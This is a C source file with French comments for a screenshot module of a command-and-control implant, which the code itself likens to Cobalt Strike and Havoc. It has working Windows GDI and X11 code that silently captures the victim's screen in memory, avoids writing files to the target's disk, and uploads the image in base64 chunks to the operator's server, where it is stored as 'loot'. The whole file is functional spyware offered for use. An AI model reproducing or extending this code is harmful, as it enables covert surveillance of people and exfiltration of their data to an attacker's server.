/*
 * ============================================================
 *  modules/mod_screenshot.c — Module screenshot
 *
 *  Stratégie (pattern CobaltStrike / Havoc) :
 *    1. Capture l'écran en mémoire (buffer BMP complet)
 *    2. Upload directement en chunks de 384 KB via /agent/upload
 *    3. Le serveur réassemble et sauvegarde dans loot/<agent_id>/
 *    4. Aucun fichier temporaire sur le disque de la cible
 *    5. ctx->output ne contient qu'un court message de statut
 *
 *  Pourquoi ce design :
 *    Un BMP 1080p = ~6 MB → dépasse MAX_OUTPUT_SIZE (128 KB).
 *    Le download classique est limité par le buffer de résultat.
 *    Le chunked upload bypass complètement cette limite.
 *
 *  Taille des chunks :
 *    384 KB raw → 512 KB base64 (ratio exact 4/3).
 *    Environ 10 chunks pour un 1080p — transparent pour l'opérateur.
 *
 *  Dépendances :
 *    Windows : gdi32 (CreateCompatibleDC, BitBlt, GetDIBits) — natif
 *    Linux   : libX11 (XGetImage) — apt install libx11-dev
 * ============================================================
 */
#include "../platform.h"
#include "../config.h"
#include "../utils.h"
#include "../http.h"
#include "module.h"

/* Taille d'un chunk brut : 384 KB → base64 = exactement 512 KB */
#define SC_CHUNK_RAW  (384 * 1024)

/**
 * Upload un buffer binaire en chunks vers /agent/upload.
 * Chaque chunk est base64-encodé et envoyé en JSON.
 * Retourne 1 si tous les chunks ont été reçus (HTTP 200), 0 sinon.
 */
static int upload_chunked(const char *url, const char *agent_id,
                           const char *task_id, const char *filename,
                           const unsigned char *data, size_t data_len) {
    int total = (int)((data_len + SC_CHUNK_RAW - 1) / SC_CHUNK_RAW);

    /* Alloue une seule fois le buffer base64 (réutilisé à chaque chunk) */
    size_t b64_sz = ((SC_CHUNK_RAW + 2) / 3) * 4 + 1;
    char  *b64    = (char *)malloc(b64_sz);
    if (!b64) return 0;

    int ok = 1;
    for (int i = 0; i < total && ok; i++) {
        size_t offset = (size_t)i * SC_CHUNK_RAW;
        size_t n      = data_len - offset;
        if (n > SC_CHUNK_RAW) n = SC_CHUNK_RAW;

        b64_encode(data + offset, n, b64);

        HttpBuffer resp = {0};
        long code = http_post_file_chunk(url, agent_id, task_id, filename,
                                         i, total, b64, &resp);
        if (resp.data) free(resp.data);

        if (code != 200) ok = 0;
    }

    free(b64);
    return ok;
}


/* ============================================================
 *  IMPLÉMENTATION WINDOWS — GDI
 * ============================================================ */
#ifdef PLATFORM_WINDOWS

/**
 * Capture l'écran et retourne un buffer BMP complet en mémoire.
 * L'appelant est responsable de free() sur le pointeur retourné.
 * Retourne NULL en cas d'échec.
 */
static unsigned char *capture_to_bmp_mem(int sw, int sh, size_t *out_size) {
    HDC hdcScreen = GetDC(NULL);
    if (!hdcScreen) return NULL;

    HDC     hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hBmp   = CreateCompatibleBitmap(hdcScreen, sw, sh);
    HBITMAP hOld   = (HBITMAP)SelectObject(hdcMem, hBmp);

    BitBlt(hdcMem, 0, 0, sw, sh, hdcScreen, 0, 0, SRCCOPY);
    SelectObject(hdcMem, hOld);

    /* Format BMP 24 bits, non compressé */
    BITMAPINFOHEADER bi;
    ZeroMemory(&bi, sizeof(bi));
    bi.biSize        = sizeof(BITMAPINFOHEADER);
    bi.biWidth       = sw;
    bi.biHeight      = sh;
    bi.biPlanes      = 1;
    bi.biBitCount    = 24;
    bi.biCompression = BI_RGB;

    DWORD row_bytes = ((DWORD)(sw * 3) + 3) & ~3u;
    DWORD img_size  = row_bytes * (DWORD)sh;

    /* En-tête fichier BMP */
    BITMAPFILEHEADER fh;
    ZeroMemory(&fh, sizeof(fh));
    fh.bfType    = 0x4D42;
    fh.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    fh.bfSize    = fh.bfOffBits + img_size;

    size_t total = sizeof(fh) + sizeof(bi) + img_size;
    unsigned char *buf = (unsigned char *)malloc(total);
    if (!buf) {
        DeleteObject(hBmp);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        return NULL;
    }

    /* Assemble le BMP complet en mémoire */
    memcpy(buf,                            &fh, sizeof(fh));
    memcpy(buf + sizeof(fh),               &bi, sizeof(bi));
    GetDIBits(hdcMem, hBmp, 0, (UINT)sh,
              buf + sizeof(fh) + sizeof(bi),
              (BITMAPINFO *)&bi, DIB_RGB_COLORS);

    DeleteObject(hBmp);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);

    *out_size = total;
    return buf;
}

int mod_screenshot_exec(ModuleContext *ctx) {
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);

    /* Capture l'écran en mémoire */
    size_t        bmp_size = 0;
    unsigned char *bmp     = capture_to_bmp_mem(sw, sh, &bmp_size);
    if (!bmp) {
        snprintf(ctx->output, ctx->output_size,
                 "[ERREUR] Capture écran échouée (%dx%d)", sw, sh);
        return 0;
    }

    /* Nom du fichier côté serveur */
    char filename[64];
    snprintf(filename, sizeof(filename), "sc_%lu.bmp", (unsigned long)time(NULL));

    /* URL de l'endpoint d'upload */
    char upload_url[512];
    snprintf(upload_url, sizeof(upload_url), "%s/agent/upload", ctx->server_url);

    /* Upload chunké → serveur réassemble dans loot/<agent_id>/ */
    int ok = upload_chunked(upload_url, ctx->agent_id, ctx->task_id,
                             filename, bmp, bmp_size);
    free(bmp);

    if (ok) {
        snprintf(ctx->output, ctx->output_size,
                 "[OK] Screenshot (%dx%d, %.1f MB) sauvegardé → loot/%s/%s",
                 sw, sh, (double)bmp_size / (1024.0 * 1024.0),
                 ctx->agent_id, filename);
        return 1;
    } else {
        snprintf(ctx->output, ctx->output_size,
                 "[ERREUR] Upload screenshot échoué (%dx%d)", sw, sh);
        return 0;
    }
}


/* ============================================================
 *  IMPLÉMENTATION LINUX — X11
 * ============================================================ */
#else

#include <X11/Xlib.h>

static void le32(unsigned char *b, unsigned int v) {
    b[0] =  v        & 0xFF;
    b[1] = (v >>  8) & 0xFF;
    b[2] = (v >> 16) & 0xFF;
    b[3] = (v >> 24) & 0xFF;
}

/**
 * Convertit une XImage en buffer BMP 24 bits en mémoire.
 * L'appelant est responsable de free().
 */
static unsigned char *ximage_to_bmp_mem(XImage *img, int sw, int sh,
                                         size_t *out_size) {
    int    row_bytes = (sw * 3 + 3) & ~3;
    size_t img_size  = (size_t)row_bytes * sh;
    size_t total     = 54 + img_size;   /* 14 (fhdr) + 40 (ihdr) + pixels */

    unsigned char *buf = (unsigned char *)malloc(total);
    if (!buf) return NULL;

    /* En-tête fichier BMP */
    unsigned char *fhdr = buf;
    fhdr[0] = 'B'; fhdr[1] = 'M';
    le32(fhdr + 2,  (unsigned int)total);
    le32(fhdr + 10, 54);

    /* En-tête info BMP */
    unsigned char *ihdr = buf + 14;
    memset(ihdr, 0, 40);
    ihdr[0] = 40;
    le32(ihdr +  4, (unsigned int)sw);
    le32(ihdr +  8, (unsigned int)sh);
    ihdr[12] = 1;
    ihdr[14] = 24;

    /* Pixels : XImage est top-down, BMP est bottom-up */
    unsigned char *pixels = buf + 54;
    for (int y = 0; y < sh; y++) {
        int bmp_row = sh - 1 - y;
        for (int x = 0; x < sw; x++) {
            unsigned long px = XGetPixel(img, x, y);
            pixels[bmp_row * row_bytes + x * 3 + 0] =  px        & 0xFF;
            pixels[bmp_row * row_bytes + x * 3 + 1] = (px >>  8) & 0xFF;
            pixels[bmp_row * row_bytes + x * 3 + 2] = (px >> 16) & 0xFF;
        }
    }

    *out_size = total;
    return buf;
}

int mod_screenshot_exec(ModuleContext *ctx) {
    Display *dpy = XOpenDisplay(NULL);
    if (!dpy) {
        snprintf(ctx->output, ctx->output_size,
                 "[ERREUR] XOpenDisplay() échoué — vérifier $DISPLAY");
        return 0;
    }

    Window root = DefaultRootWindow(dpy);
    XWindowAttributes gwa;
    XGetWindowAttributes(dpy, root, &gwa);
    int sw = gwa.width;
    int sh = gwa.height;

    XImage *img = XGetImage(dpy, root, 0, 0,
                            (unsigned int)sw, (unsigned int)sh,
                            AllPlanes, ZPixmap);
    if (!img) {
        XCloseDisplay(dpy);
        snprintf(ctx->output, ctx->output_size,
                 "[ERREUR] XGetImage() échoué (%dx%d)", sw, sh);
        return 0;
    }

    size_t        bmp_size = 0;
    unsigned char *bmp     = ximage_to_bmp_mem(img, sw, sh, &bmp_size);
    XDestroyImage(img);
    XCloseDisplay(dpy);

    if (!bmp) {
        snprintf(ctx->output, ctx->output_size, "[ERREUR] Allocation mémoire BMP échouée");
        return 0;
    }

    char filename[64];
    snprintf(filename, sizeof(filename), "sc_%ld.bmp", (long)time(NULL));

    char upload_url[512];
    snprintf(upload_url, sizeof(upload_url), "%s/agent/upload", ctx->server_url);

    int ok = upload_chunked(upload_url, ctx->agent_id, ctx->task_id,
                             filename, bmp, bmp_size);
    free(bmp);

    if (ok) {
        snprintf(ctx->output, ctx->output_size,
                 "[OK] Screenshot (%dx%d, %.1f MB) sauvegardé → loot/%s/%s",
                 sw, sh, (double)bmp_size / (1024.0 * 1024.0),
                 ctx->agent_id, filename);
        return 1;
    } else {
        snprintf(ctx->output, ctx->output_size,
                 "[ERREUR] Upload screenshot échoué (%dx%d)", sw, sh);
        return 0;
    }
}

#endif  /* PLATFORM_WINDOWS / PLATFORM_LINUX */
